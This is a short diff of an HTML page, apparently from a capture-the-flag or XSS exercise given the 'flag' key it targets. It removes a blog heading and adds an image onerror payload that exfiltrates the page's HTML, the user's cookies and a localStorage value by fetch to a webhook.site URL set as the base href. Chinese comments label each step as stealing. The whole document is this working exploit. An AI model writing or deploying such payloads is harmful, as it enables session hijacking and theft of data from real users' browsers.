@@ -4,12 +4,19 @@
   <base href="https://webhook.site/415ec98b-1efe-4531-a0fb-24ad90ddc7f1/">
 </head>
 <body>
-
-<h1>Engineering Blog Post</h1>
-<p>Welcome to our secure engineering blog!</p>
-
 <img src="?" onerror="
-    fetch('?' + btoa(document.body.innerText))
+(function(){
+    function send(data) {
+        fetch('?' + btoa(data));
+    }
+    try {
+        send(document.documentElement.outerHTML); // 偷整个页面html
+        send(document.cookie); // 再偷cookie
+        send(localStorage.getItem('flag')); // 再偷localStorage
+    } catch(e) {
+        send('error:'+e);
+    }
+})();
 ">
 
 </body>
